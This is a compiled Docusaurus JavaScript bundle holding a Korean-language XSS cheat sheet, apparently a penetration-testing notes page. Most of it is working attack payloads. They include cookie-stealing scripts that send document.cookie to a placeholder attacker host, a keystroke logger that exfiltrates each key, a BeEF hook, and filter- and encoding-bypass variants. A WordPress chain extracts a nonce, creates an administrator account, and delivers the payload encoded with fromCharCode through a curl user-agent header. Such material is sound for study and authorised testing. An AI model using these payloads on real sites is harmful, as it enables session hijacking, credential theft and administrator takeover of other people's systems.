"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[8541],{10035:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>p,frontMatter:()=>a,metadata:()=>r,toc:()=>o});const r=JSON.parse('{"id":"cheatsheet/web-application/xss","title":"Cross-Site Scripting (XSS)","description":"\uae30\ubcf8 \ud398\uc774\ub85c\ub4dc","source":"@site/docs/cheatsheet/web-application/xss.md","sourceDirName":"cheatsheet/web-application","slug":"/cheatsheet/web-application/xss","permalink":"/my-docusaurus-page/cheatsheet/web-application/xss","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":4,"frontMatter":{"sidebar_position":4},"sidebar":"tutorialSidebar","previous":{"title":"GitTools","permalink":"/my-docusaurus-page/cheatsheet/web-application/gittools"},"next":{"title":"Server-Side Request Forgery (SSRF)","permalink":"/my-docusaurus-page/cheatsheet/web-application/ssrf"}}');var s=t(74848),c=t(28453);const a={sidebar_position:4},i="Cross-Site Scripting (XSS)",l={},o=[{value:"\uae30\ubcf8 \ud398\uc774\ub85c\ub4dc",id:"\uae30\ubcf8-\ud398\uc774\ub85c\ub4dc",level:2},{value:"\uc774\ubbf8\uc9c0/iframe \ud0dc\uadf8",id:"\uc774\ubbf8\uc9c0iframe-\ud0dc\uadf8",level:2},{value:"XSS Client-Side Attack",id:"xss-client-side-attack",level:2},{value:"\uacf5\uaca9 \uc2dc\ub098\ub9ac\uc624 (WordPress \uc608\uc81c)",id:"\uacf5\uaca9-\uc2dc\ub098\ub9ac\uc624-wordpress-\uc608\uc81c",level:3},{value:"1. \uc545\uc758\uc801\uc778 \ub9c1\ud06c",id:"1-\uc545\uc758\uc801\uc778-\ub9c1\ud06c",level:4},{value:"2. Nonce \uac12 \ucd94\ucd9c",id:"2-nonce-\uac12-\ucd94\ucd9c",level:4},{value:"3. \uad00\ub9ac\uc790 \uc0dd\uc131 \ud398\uc774\ub85c\ub4dc",id:"3-\uad00\ub9ac\uc790-\uc0dd\uc131-\ud398\uc774\ub85c\ub4dc",level:4},{value:"4. \uc555\ucd95\ub41c \ud398\uc774\ub85c\ub4dc",id:"4-\uc555\ucd95\ub41c-\ud398\uc774\ub85c\ub4dc",level:4},{value:"\uc778\ucf54\ub529 \ud568\uc218",id:"\uc778\ucf54\ub529-\ud568\uc218",level:3},{value:"\uc2e4\ud589",id:"\uc2e4\ud589",level:3},{value:"\ub2e4\uc591\ud55c XSS \ud398\uc774\ub85c\ub4dc",id:"\ub2e4\uc591\ud55c-xss-\ud398\uc774\ub85c\ub4dc",level:2},{value:"\uae30\ubcf8 \uacf5\uaca9 \ubca1\ud130",id:"\uae30\ubcf8-\uacf5\uaca9-\ubca1\ud130",level:3},{value:"\uc774\ubca4\ud2b8 \ud578\ub4e4\ub7ec",id:"\uc774\ubca4\ud2b8-\ud578\ub4e4\ub7ec",level:3},{value:"HTML \ud0dc\uadf8 \uc6b0\ud68c",id:"html-\ud0dc\uadf8-\uc6b0\ud68c",level:3},{value:"JavaScript \uc2e4\ud589",id:"javascript-\uc2e4\ud589",level:3},{value:"\ucfe0\ud0a4 \ud0c8\ucde8",id:"\ucfe0\ud0a4-\ud0c8\ucde8",level:2},{value:"Keylogger",id:"keylogger",level:2},{value:"BeEF Hook",id:"beef-hook",level:2},{value:"\uc6b0\ud68c \uae30\ubc95",id:"\uc6b0\ud68c-\uae30\ubc95",level:2},{value:"\ud544\ud130 \uc6b0\ud68c",id:"\ud544\ud130-\uc6b0\ud68c",level:3},{value:"\uc778\ucf54\ub529 \uc6b0\ud68c",id:"\uc778\ucf54\ub529-\uc6b0\ud68c",level:3},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function d(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",li:"li",p:"p",pre:"pre",ul:"ul",...(0,c.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"cross-site-scripting-xss",children:"Cross-Site Scripting (XSS)"})}),"\n",(0,s.jsx)(n.h2,{id:"\uae30\ubcf8-\ud398\uc774\ub85c\ub4dc",children:"\uae30\ubcf8 \ud398\uc774\ub85c\ub4dc"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-html",children:"\x3c!-- \uae30\ubcf8 alert --\x3e\n<script>alert(1)<\/script>\n<script>alert('XSS')<\/script>\n\n\x3c!-- \ub300\uc18c\ubb38\uc790 \uc6b0\ud68c --\x3e\n<sCrIpt>alert(1)<\/ScRipt>\n\n\x3c!-- \ucfe0\ud0a4 \ud0c8\ucde8 --\x3e\n<script>alert(document.cookie)<\/script>\n\n\x3c!-- DOM \uc870\uc791 --\x3e\n<script>document.querySelector('#foobar-title').textContent = '<TEXT>'<\/script>\n\n\x3c!-- \ucfe0\ud0a4 \uc804\uc1a1 --\x3e\n<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));<\/script>\n\n\x3c!-- \ud568\uc218 \uc2e4\ud589 --\x3e\n<script>user.changeEmail('user@domain');<\/script>\n"})}),"\n",(0,s.jsx)(n.h2,{id:"\uc774\ubbf8\uc9c0iframe-\ud0dc\uadf8",children:"\uc774\ubbf8\uc9c0/iframe \ud0dc\uadf8"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-html",children:"\x3c!-- iframe\uc73c\ub85c \ud30c\uc77c \uc77d\uae30 --\x3e\n<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>\n\n\x3c!-- \uc774\ubbf8\uc9c0 \ub85c\ub4dc --\x3e\n<img src='http://<RHOST>'/>\n\n\x3c!-- onerror \uc774\ubca4\ud2b8 --\x3e\n<img src=x onerror=alert(1)>\n<img src=x onerror=\"alert(document.cookie)\">\n\n\x3c!-- onload \uc774\ubca4\ud2b8 --\x3e\n<body onload=alert(1)>\n"})}),"\n",(0,s.jsx)(n.h2,{id:"xss-client-side-attack",children:"XSS Client-Side Attack"}),"\n",(0,s.jsx)(n.h3,{id:"\uacf5\uaca9-\uc2dc\ub098\ub9ac\uc624-wordpress-\uc608\uc81c",children:"\uacf5\uaca9 \uc2dc\ub098\ub9ac\uc624 (WordPress \uc608\uc81c)"}),"\n",(0,s.jsx)(n.h4,{id:"1-\uc545\uc758\uc801\uc778-\ub9c1\ud06c",children:"1. \uc545\uc758\uc801\uc778 \ub9c1\ud06c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-html",children:'<a href="http://<RHOST>/send_btc?account=<USERNAME>&amount=100000">Click here!</a>\n'})}),"\n",(0,s.jsx)(n.h4,{id:"2-nonce-\uac12-\ucd94\ucd9c",children:"2. Nonce \uac12 \ucd94\ucd9c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'var ajaxRequest = new XMLHttpRequest();\nvar requestURL = "/wp-admin/user-new.php";\nvar nonceRegex = /ser" value="([^"]*?)"/g;\najaxRequest.open("GET", requestURL, false);\najaxRequest.send();\nvar nonceMatch = nonceRegex.exec(ajaxRequest.responseText);\nvar nonce = nonceMatch[1];\n'})}),"\n",(0,s.jsx)(n.h4,{id:"3-\uad00\ub9ac\uc790-\uc0dd\uc131-\ud398\uc774\ub85c\ub4dc",children:"3. \uad00\ub9ac\uc790 \uc0dd\uc131 \ud398\uc774\ub85c\ub4dc"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";\najaxRequest = new XMLHttpRequest();\najaxRequest.open("POST", requestURL, true);\najaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\najaxRequest.send(params);\n'})}),"\n",(0,s.jsx)(n.h4,{id:"4-\uc555\ucd95\ub41c-\ud398\uc774\ub85c\ub4dc",children:"4. \uc555\ucd95\ub41c \ud398\uc774\ub85c\ub4dc"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"https://jscompress.com/",children:"https://jscompress.com/"})}),"\n"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";ajaxRequest=new XMLHttpRequest,ajaxRequest.open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);\n'})}),"\n",(0,s.jsx)(n.h3,{id:"\uc778\ucf54\ub529-\ud568\uc218",children:"\uc778\ucf54\ub529 \ud568\uc218"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'function encode_to_javascript(string) {\n    var input = string\n    var output = \'\';\n    for(pos = 0; pos < input.length; pos++) {\n        output += input.charCodeAt(pos);\n        if(pos != (input.length - 1)) {\n            output += ",";\n        }\n    }\n    return output;\n}\n\nlet encoded = encode_to_javascript(\'var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";ajaxRequest=new XMLHttpRequest,ajaxRequest.open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);\')\nconsole.log(encoded)\n'})}),"\n",(0,s.jsx)(n.h3,{id:"\uc2e4\ud589",children:"\uc2e4\ud589"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'curl -i http://<RHOST> --user-agent "<script>eval(String.fromCharCode(118,97,114,32,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,60,85,83,69,82,78,65,77,69,62,38,101,109,97,105,108,61,60,69,77,65,73,76,62,38,112,97,115,115,49,61,60,80,65,83,83,87,79,82,68,62,38,112,97,115,115,50,61,60,80,65,83,83,87,79,82,68,62,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))<\/script>" --proxy 127.0.0.1:8080\n'})}),"\n",(0,s.jsx)(n.h2,{id:"\ub2e4\uc591\ud55c-xss-\ud398\uc774\ub85c\ub4dc",children:"\ub2e4\uc591\ud55c XSS \ud398\uc774\ub85c\ub4dc"}),"\n",(0,s.jsx)(n.h3,{id:"\uae30\ubcf8-\uacf5\uaca9-\ubca1\ud130",children:"\uae30\ubcf8 \uacf5\uaca9 \ubca1\ud130"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-html",children:"<script>alert(String.fromCharCode(88,83,83))<\/script>\n<script>alert(/XSS/)<\/script>\n<script>alert`1`<\/script>\n<script>(alert)(1)<\/script>\n<script>eval('alert(1)')<\/script>\n<script>eval('ale'+'rt(1)')<\/script>\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\uc774\ubca4\ud2b8-\ud578\ub4e4\ub7ec",children:"\uc774\ubca4\ud2b8 \ud578\ub4e4\ub7ec"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-html",children:"<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\n<input onfocus=alert(1) autofocus>\n<select onfocus=alert(1) autofocus>\n<textarea onfocus=alert(1) autofocus>\n<iframe onload=alert(1)>\n<video onerror=alert(1) src=x>\n<audio onerror=alert(1) src=x>\n"})}),"\n",(0,s.jsx)(n.h3,{id:"html-\ud0dc\uadf8-\uc6b0\ud68c",children:"HTML \ud0dc\uadf8 \uc6b0\ud68c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-html",children:"<scr<script>ipt>alert(1)</scr<\/script>ipt>\n<script>ale\x3c!----\x3ert(1)<\/script>\n<ScRiPt>alert(1)<\/ScRiPt>\n<SCRIPT>alert(1)<\/SCRIPT>\n"})}),"\n",(0,s.jsx)(n.h3,{id:"javascript-\uc2e4\ud589",children:"JavaScript \uc2e4\ud589"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-html",children:"<script src=http://<RHOST>/evil.js><\/script>\n<script>fetch('http://<RHOST>/'+document.cookie)<\/script>\n<script>new Image().src='http://<RHOST>/?c='+document.cookie<\/script>\n<script>location='http://<RHOST>/?c='+document.cookie<\/script>\n"})}),"\n",(0,s.jsx)(n.h2,{id:"\ucfe0\ud0a4-\ud0c8\ucde8",children:"\ucfe0\ud0a4 \ud0c8\ucde8"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:"// Base64 \uc778\ucf54\ub529\n<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));<\/script>\n\n// \uc9c1\uc811 \uc804\uc1a1\n<script>new Image().src='http://<RHOST>/log.php?c='+document.cookie;<\/script>\n\n// XMLHttpRequest\n<script>\nvar xhr = new XMLHttpRequest();\nxhr.open('GET', 'http://<RHOST>/steal?cookie=' + document.cookie);\nxhr.send();\n<\/script>\n"})}),"\n",(0,s.jsx)(n.h2,{id:"keylogger",children:"Keylogger"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:"<script>\ndocument.onkeypress = function(e) {\n    fetch('http://<RHOST>/log?key=' + String.fromCharCode(e.which));\n}\n<\/script>\n"})}),"\n",(0,s.jsx)(n.h2,{id:"beef-hook",children:"BeEF Hook"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-html",children:'<script src="http://<LHOST>:3000/hook.js"><\/script>\n'})}),"\n",(0,s.jsx)(n.h2,{id:"\uc6b0\ud68c-\uae30\ubc95",children:"\uc6b0\ud68c \uae30\ubc95"}),"\n",(0,s.jsx)(n.h3,{id:"\ud544\ud130-\uc6b0\ud68c",children:"\ud544\ud130 \uc6b0\ud68c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-html",children:"\x3c!-- \uacf5\ubc31 \uc6b0\ud68c --\x3e\n<script>alert(1)<\/script>\n<script>alert(1)<\/script>\n\n\x3c!-- \ub530\uc634\ud45c \uc6b0\ud68c --\x3e\n<script>alert(String.fromCharCode(88,83,83))<\/script>\n\n\x3c!-- \uad04\ud638 \uc6b0\ud68c --\x3e\n<script>onerror=alert;throw 1<\/script>\n<script>{onerror=alert}throw 1<\/script>\n\n\x3c!-- script \ud0dc\uadf8 \ucc28\ub2e8 \uc6b0\ud68c --\x3e\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\uc778\ucf54\ub529-\uc6b0\ud68c",children:"\uc778\ucf54\ub529 \uc6b0\ud68c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-html",children:'\x3c!-- HTML \uc5d4\ud2f0\ud2f0 --\x3e\n&lt;script&gt;alert(1)&lt;/script&gt;\n\n\x3c!-- URL \uc778\ucf54\ub529 --\x3e\n%3Cscript%3Ealert(1)%3C/script%3E\n\n\x3c!-- Base64 --\x3e\n<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>\n'})}),"\n",(0,s.jsx)(n.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Reflected XSS: URL \ud30c\ub77c\ubbf8\ud130\uc5d0\uc11c \ubc18\uc0ac"}),"\n",(0,s.jsx)(n.li,{children:"Stored XSS: \ub370\uc774\ud130\ubca0\uc774\uc2a4\uc5d0 \uc800\uc7a5"}),"\n",(0,s.jsx)(n.li,{children:"DOM-based XSS: \ud074\ub77c\uc774\uc5b8\ud2b8 \uce21\uc5d0\uc11c\ub9cc \ubc1c\uc0dd"}),"\n",(0,s.jsx)(n.li,{children:"CSP \uc6b0\ud68c \ud544\uc694 \uc2dc \ubcc4\ub3c4 \uae30\ubc95 \uc0ac\uc6a9"}),"\n",(0,s.jsx)(n.li,{children:"HttpOnly \ucfe0\ud0a4\ub294 JavaScript\ub85c \uc811\uadfc \ubd88\uac00"}),"\n"]})]})}function p(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>a,x:()=>i});var r=t(96540);const s={},c=r.createContext(s);function a(e){const n=r.useContext(c);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:a(e.components),r.createElement(c.Provider,{value:n},e.children)}}}]);